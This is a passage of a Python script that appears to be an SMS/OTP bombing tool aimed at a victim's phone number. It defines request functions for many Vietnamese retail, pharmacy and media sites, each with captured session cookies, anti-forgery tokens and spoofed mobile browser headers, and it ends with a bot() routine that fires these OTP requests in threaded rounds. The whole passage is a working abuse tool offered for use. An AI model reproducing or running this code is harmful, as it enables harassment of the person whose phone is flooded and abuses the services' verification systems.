        'statictoken': 'e633865a31fa27f35b8499e1a75b0a76',
        'id_customer': '0',
    }

    response = requests.post('https://concung.com/ajax.html?sendOtpLogin', cookies=cookies, headers=headers, data=data)
###
def lotte():
    cookies = {
        '_gcl_au': '1.1.1380052042.1696172508',
        '__Host-next-auth.csrf-token': 'b6731bfa396ae9486e9b6dbd9a774b3f8e203c4a84523e940b7a661f06c65a72%7Cbc35f656244869b44865ab6210819966b891290609d2f44ce4957bf4cb4fc62f',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
        '_ga': 'GA1.1.625673941.1696172509',
        '_fbp': 'fb.1.1696172509630.1101002078',
        '_ga_6QLJ7DM4XW': 'GS1.1.1696172509.1.1.1696172526.0.0.0',
    }

    headers = {
        'authority': 'www.lottemart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1380052042.1696172508; __Host-next-auth.csrf-token=b6731bfa396ae9486e9b6dbd9a774b3f8e203c4a84523e940b7a661f06c65a72%7Cbc35f656244869b44865ab6210819966b891290609d2f44ce4957bf4cb4fc62f; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _ga=GA1.1.625673941.1696172509; _fbp=fb.1.1696172509630.1101002078; _ga_6QLJ7DM4XW=GS1.1.1696172509.1.1.1696172526.0.0.0',
        'origin': 'https://www.lottemart.vn',
        'referer': 'https://www.lottemart.vn/signup',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'username': phone,
        'case': 'register',
    }

    response = requests.post(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
###
def fahasa():
    cookies = {
        'frontend': '0b3511cbb4fb44fb82cc79dc6e857e52',
        '_gcl_au': '1.1.1346023506.1696172650',
        '_gcl_aw': 'GCL.1696172650.CjwKCAjwseSoBhBXEiwA9iZtxvI-ZicCQ4x3G4krk5-eJDPOY2vQ68BhH_Lgwi4XIJyvRUQhDVg5KxoC738QAvD_BwE',
        'utm_source': 'google',
        '_ga': 'GA1.1.659809284.1696172654',
        '_tt_enable_cookie': '1',
        '_ttp': '4pKrYeW9wLrYT12gWrf8U0WlNHZ',
        '_clck': '1etycls|2|ffh|0|1369',
        '_fbp': 'fb.1.1696172654442.1688955659',
        'moe_uuid': '7bc6b19b-d5c8-4af8-b224-3ed0b68880f6',
        'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%227bc6b19b-d5c8-4af8-b224-3ed0b68880f6%22%2C%22deviceAdded%22%3Atrue%7D',
        '_ga_460L9JMC2G': 'GS1.1.1696172653.1.1.1696172666.47.0.0',
        '_clsk': 'gtoip|1696172666896|2|1|w.clarity.ms/collect',
    }

    headers = {
        'authority': 'www.fahasa.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=0b3511cbb4fb44fb82cc79dc6e857e52; _gcl_au=1.1.1346023506.1696172650; _gcl_aw=GCL.1696172650.CjwKCAjwseSoBhBXEiwA9iZtxvI-ZicCQ4x3G4krk5-eJDPOY2vQ68BhH_Lgwi4XIJyvRUQhDVg5KxoC738QAvD_BwE; utm_source=google; _ga=GA1.1.659809284.1696172654; _tt_enable_cookie=1; _ttp=4pKrYeW9wLrYT12gWrf8U0WlNHZ; _clck=1etycls|2|ffh|0|1369; _fbp=fb.1.1696172654442.1688955659; moe_uuid=7bc6b19b-d5c8-4af8-b224-3ed0b68880f6; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%227bc6b19b-d5c8-4af8-b224-3ed0b68880f6%22%2C%22deviceAdded%22%3Atrue%7D; _ga_460L9JMC2G=GS1.1.1696172653.1.1.1696172666.47.0.0; _clsk=gtoip|1696172666896|2|1|w.clarity.ms/collect',
        'origin': 'https://www.fahasa.com',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-5f79623682868c70cb9231f3ffc0c372-801b135f67f68937-01',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
    }

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
#####
def ICANKID():
  headers = {
    'Host': 'id.icankid.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '134',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'Accept': '*/*',
    'Origin': 'https://id.icankid.vn',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://id.icankid.vn/auth',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_fbp=fb.1.1693704584997.1439624676; _hjSessionUser_3154488=eyJpZCI6IjNkNDg4YmVjLWE2MmUtNWM4ZS04NGE5LWU0MzVmY2UxNGI3YiIsImNyZWF0ZWQiOjE2OTM3MDQ1ODU0MDUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3154488=0; _hjSession_3154488=eyJpZCI6IjU0MjUwNTRkLTdjZGYtNDc2Mi05YTNiLTNkZWEwZDI1MjExYSIsImNyZWF0ZWQiOjE2OTM3MDQ1ODU0MTgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1',
}
  data = '{"phone":"phone","challenge_code":"6ecfd33fc176836a157260eb","challenge_method":"SHA256"}'.replace("phone",phone)
  response = requests.post('https://id.icankid.vn/api/otp/challenge/', headers=headers, data=data).text 
def ankhang():
  cookies = {
      'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
      'MWG_PRODUCT_BASIC_DB': 'FFUR64ug9ExN62Kz0zE1eb7VtmrIbngOLw6_Tc0lv%2FQAduBkrQNV0Q--',
      '_gcl_au': '1.1.1755911141.1696174180',
      '_ga': 'GA1.1.611097042.1696174180',
      '_pk_id.2.b94a': 'af9fd3f158e2bfcf.1696174180.',
      '_fbp': 'fb.1.1696174180012.837280744',
      'TBMCookie_3209819802479625248': '392607001697284474ad8IoD1cFaawDNPXFYkpWjqB2vc=',
      '___utmvm': '###########',
      '.AspNetCore.Antiforgery.PgYZnA9bRvk': 'CfDJ8OzT4w9F3NBBtKYXpiQJSWu5st6jUnhCWq9uOVWucPHkqXvt7YUc83XPzcCN8dH6OSsXgjsSWzVzlJbnlCAVIcNRvzapC60zVU2hMNhrtMtQ3sBe1Wjsu6Qx-u7X2cvreh5zKcc0U_vwzwomvhcQtw4',
      '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
      'SvID': 'ak213|ZSqBg|ZSqBf',
      '_pk_ref.2.b94a': '%5B%22%22%2C%22%22%2C1697284478%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
      '_pk_ses.2.b94a': '1',
      '.AspNetCore.Antiforgery.q5r70a3YBCY': 'CfDJ8EAyW5oxzlJBpu_em4xhyNuSeQ_6B4GBOA6SJi3YqG2bGc2nN0WNENancxRU7PVFsROGbmMFoNZ9_vNhGXaXpl0gnlcraNJTqlzwFz2wQDPyP2E7VRM0Vp259a_5YtqpNwQyo3GEoHQbRGKQnnhxTwY',
      'MWG_CART_SS_10': 'CfDJ8EAyW5oxzlJBpu%2Fem4xhyNtneiaYC7iiehpVN8BWsZUIogk9i6C5NvGAT2oVprfldARZlpoj9guYnXWKQlbYPeO8snmWWT24qlA21T49mo0a85UD75ejhcByoLTu7zrOYUmhQKeWmeoc4lvGp7Z1U6Zp4WxwVWrRHIm34DGib0RH',
      'cebs': '1',
      '_ce.clock_event': '1',
      '_ce.clock_data': '279%2C1.55.45.32%2C1%2C22210ca73bf1af2ec2eace74a96ee356',
      '.AspNetCore.Antiforgery.4PZsHduyjpg': 'CfDJ8ImUV2tmepFDqJx13sccnB5HC0MRq2K9V4PVLOIOzp8DUyV4TL90LEs_bvdhKYLOP6wcWYxcmbCKf02nONk5ItsM2YmiLGa9i3sET2nxyQYalZqEIT6lVNZRVMlv3w-dFoGKF-wmk8K34zK6dVU3wXw',
      'cebsp_': '2',
      '_ga_D1DPPSN7B8': 'GS1.1.1697284478.2.1.1697284488.50.0.0',
      '_ce.s': 'v~05640ed4cbca8cedfb5f924737cbbf40d1e3a5ca~lcw~1697284492034~vpv~1~v11.cs~403690~v11.s~73e30b60-6a88-11ee-903c-9d457b2b7cfe~v11.sla~1697284492035~lcw~1697284492035',
  }

  headers = {
      'Accept': '*/*',
      'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; MWG_PRODUCT_BASIC_DB=FFUR64ug9ExN62Kz0zE1eb7VtmrIbngOLw6_Tc0lv%2FQAduBkrQNV0Q--; _gcl_au=1.1.1755911141.1696174180; _ga=GA1.1.611097042.1696174180; _pk_id.2.b94a=af9fd3f158e2bfcf.1696174180.; _fbp=fb.1.1696174180012.837280744; TBMCookie_3209819802479625248=392607001697284474ad8IoD1cFaawDNPXFYkpWjqB2vc=; ___utmvm=###########; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8OzT4w9F3NBBtKYXpiQJSWu5st6jUnhCWq9uOVWucPHkqXvt7YUc83XPzcCN8dH6OSsXgjsSWzVzlJbnlCAVIcNRvzapC60zVU2hMNhrtMtQ3sBe1Wjsu6Qx-u7X2cvreh5zKcc0U_vwzwomvhcQtw4; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=ak213|ZSqBg|ZSqBf; _pk_ref.2.b94a=%5B%22%22%2C%22%22%2C1697284478%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.2.b94a=1; .AspNetCore.Antiforgery.q5r70a3YBCY=CfDJ8EAyW5oxzlJBpu_em4xhyNuSeQ_6B4GBOA6SJi3YqG2bGc2nN0WNENancxRU7PVFsROGbmMFoNZ9_vNhGXaXpl0gnlcraNJTqlzwFz2wQDPyP2E7VRM0Vp259a_5YtqpNwQyo3GEoHQbRGKQnnhxTwY; MWG_CART_SS_10=CfDJ8EAyW5oxzlJBpu%2Fem4xhyNtneiaYC7iiehpVN8BWsZUIogk9i6C5NvGAT2oVprfldARZlpoj9guYnXWKQlbYPeO8snmWWT24qlA21T49mo0a85UD75ejhcByoLTu7zrOYUmhQKeWmeoc4lvGp7Z1U6Zp4WxwVWrRHIm34DGib0RH; cebs=1; _ce.clock_event=1; _ce.clock_data=279%2C1.55.45.32%2C1%2C22210ca73bf1af2ec2eace74a96ee356; .AspNetCore.Antiforgery.4PZsHduyjpg=CfDJ8ImUV2tmepFDqJx13sccnB5HC0MRq2K9V4PVLOIOzp8DUyV4TL90LEs_bvdhKYLOP6wcWYxcmbCKf02nONk5ItsM2YmiLGa9i3sET2nxyQYalZqEIT6lVNZRVMlv3w-dFoGKF-wmk8K34zK6dVU3wXw; cebsp_=2; _ga_D1DPPSN7B8=GS1.1.1697284478.2.1.1697284488.50.0.0; _ce.s=v~05640ed4cbca8cedfb5f924737cbbf40d1e3a5ca~lcw~1697284492034~vpv~1~v11.cs~403690~v11.s~73e30b60-6a88-11ee-903c-9d457b2b7cfe~v11.sla~1697284492035~lcw~1697284492035",
      'Origin': 'https://www.nhathuocankhang.com',
      'Referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
      'X-Requested-With': 'XMLHttpRequest',
      'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
  }

  data = {
      'phoneNumber': phone,
      'isReSend': 'false',
      'sendOTPType': '1',
      '__RequestVerificationToken': 'CfDJ8ImUV2tmepFDqJx13sccnB4ARknfeG7jasHc1oxqNP-UzqhtXfrlouaPkZJun19l56zgt9ey-CK06nOdtac42CBvKnaCEpQE8pJmqG2DuF8NaOfgrPo2PRL7PQdJwBNYdO3d3ZNyHDdOnjhSIku8P4s',
  }

  response = requests.post(
      'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
      cookies=cookies,
      headers=headers,
      data=data,
  )
def hasaki():
  cookies = {
    'sessionChecked': '1702999897',
    'HASAKI_SESSID': '624e01729e43ec75376e4262f6ab9dd2',
    'form_key': '624e01729e43ec75376e4262f6ab9dd2',
    'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
    'PHPSESSID': 'opmfh1g74bnkcjcuc5e1juu983',
    '_gid': 'GA1.2.799819775.1702999942',
    '_gcl_au': '1.1.1345447158.1702999942',
    '_fbp': 'fb.1.1702999942386.658131962',
    '_ga': 'GA1.1.467563738.1702999942',
    '__admUTMtime': '1702999942',
    '_ga_MMWZXZ1JWH': 'GS1.2.1702999942.1.0.1702999942.60.0.0',
    '_tt_enable_cookie': '1',
    '_ttp': 'ou3RGYuTX72lP5Gz8PbLREsTaa7',
    'dtdz': 'f6521d8a-512f-4ed2-a693-b9fbf2bb1426',
    '__iid': '7895',
    '__iid': '7895',
    '__su': '0',
    '__su': '0',
    '__RC': '59',
    '__R': '3',
    '__uif': '__uid%3A359787302520393248%7C__ui%3A1%252C6%7C__create%3A1697873025',
    '_ga_40EJN12JB0': 'GS1.1.1702999942.1.0.1702999956.46.0.0',
  }

  headers = {
    'authority': 'hasaki.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    # 'cookie': 'sessionChecked=1702999897; HASAKI_SESSID=624e01729e43ec75376e4262f6ab9dd2; form_key=624e01729e43ec75376e4262f6ab9dd2; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=opmfh1g74bnkcjcuc5e1juu983; _gid=GA1.2.799819775.1702999942; _gcl_au=1.1.1345447158.1702999942; _fbp=fb.1.1702999942386.658131962; _ga=GA1.1.467563738.1702999942; __admUTMtime=1702999942; _ga_MMWZXZ1JWH=GS1.2.1702999942.1.0.1702999942.60.0.0; _tt_enable_cookie=1; _ttp=ou3RGYuTX72lP5Gz8PbLREsTaa7; dtdz=f6521d8a-512f-4ed2-a693-b9fbf2bb1426; __iid=7895; __iid=7895; __su=0; __su=0; __RC=59; __R=3; __uif=__uid%3A359787302520393248%7C__ui%3A1%252C6%7C__create%3A1697873025; _ga_40EJN12JB0=GS1.1.1702999942.1.0.1702999956.46.0.0',
    'referer': 'https://hasaki.vn/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  params = {
    'api': 'user.verifyUserName',
    'username': phone,
  }

  response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
def mocha():
  headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
  }

  params = {
    'msisdn': phone,
    'languageCode': 'vi',
  }

  response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
def bot():
    for i in range(3):      
        threading.submit(call2)
        threading.submit(winmart)
        threading.submit(ecogreen)
        threading.submit(muaban)
        threading.submit(myvietel)
        time.sleep(1)
        threading.submit(fptshop)
        threading.submit(vtpost)
        threading.submit(tv360)
        threading.submit(ghn)
        threading.submit(call5)
        time.sleep(1)
        threading.submit(phuclong)
        threading.submit(vieon)
        threading.submit(pizzahunt)
        threading.submit(longchau)
        threading.submit(call1)
##############################################
bot()
